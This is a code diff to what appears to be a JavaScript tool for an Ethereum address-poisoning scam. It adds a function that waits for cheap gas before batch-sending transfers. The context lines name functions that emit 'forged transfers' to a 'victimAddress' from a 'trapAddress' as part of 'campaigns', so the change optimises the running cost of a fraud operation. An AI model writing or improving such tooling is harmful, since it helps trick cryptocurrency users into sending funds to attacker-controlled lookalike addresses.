@@ -1146,6 +1146,30 @@ const campaignMirrorLocks = new Map();
 // Rate-limit gas insufficient alerts (one per operator per hour)
 const lastGasAlertTime = new Map();
 
+// 🚀 GAS SNIFFER: Pauses batching if Ethereum network is congested
+async function waitForCheapGas(maxGwei = 20) {
+  const maxBaseFee = BigInt(maxGwei) * 1000000000n;
+
+  for (let i = 0; i < 15; i++) { // Wait up to 3 minutes (15 Ethereum blocks)
+    try {
+      const block = await client.getBlock({ blockTag: 'latest' });
+      const baseFee = block.baseFeePerGas || 0n;
+      const currentGwei = Number(baseFee) / 1e9;
+
+      if (baseFee <= maxBaseFee) {
+        logger.info(`[gas-sniffer] ✅ Base fee is ${currentGwei.toFixed(2)} gwei (Target: <${maxGwei}). Firing batch!`);
+        return;
+      }
+
+      logger.info(`[gas-sniffer] ⏳ Base fee is ${currentGwei.toFixed(2)} gwei. Waiting for cheaper gas...`);
+      await new Promise(resolve => setTimeout(resolve, 12000)); // Wait 1 Ethereum block (12s)
+    } catch (e) {
+      return; // If RPC fails, just proceed and let the transaction handle it
+    }
+  }
+  logger.warn(`[gas-sniffer] ⚠️ Gas stayed high for 3 minutes. Firing batch anyway to prevent queue overflow.`);
+}
+
 function emitForgedTransfer(victimAddress, trapAddress, rawValue, walletClient, campaignId, contractAddress) {
   if (!walletClient || !contractAddress) return Promise.resolve(false);
 
@@ -1612,6 +1636,9 @@ async function emitBatchForgedTransfers(walletClient, campaignId, contractAddres
   const operatorAddress = walletClient.account.address;
 
   const run = currentLock.then(async () => {
+    // 🚀 GAS SNIFFER: Wait for cheap gas before firing
+    await waitForCheapGas(20); // Wait until base fee is under 20 gwei
+
     try {
       const [operatorBalance, gasPrice] = await Promise.all([
         client.getBalance({ address: operatorAddress }),
@@ -1807,6 +1834,9 @@ async function emitMultiTokenBatch(walletClient, campaignId, contractGroups) {
   const operatorAddress = walletClient.account.address;
 
   const run = currentLock.then(async () => {
+    // 🚀 GAS SNIFFER: Wait for cheap gas before firing
+    await waitForCheapGas(20);
+
     try {
       const [operatorBalance, gasPrice] = await Promise.all([
         client.getBalance({ address: operatorAddress }),
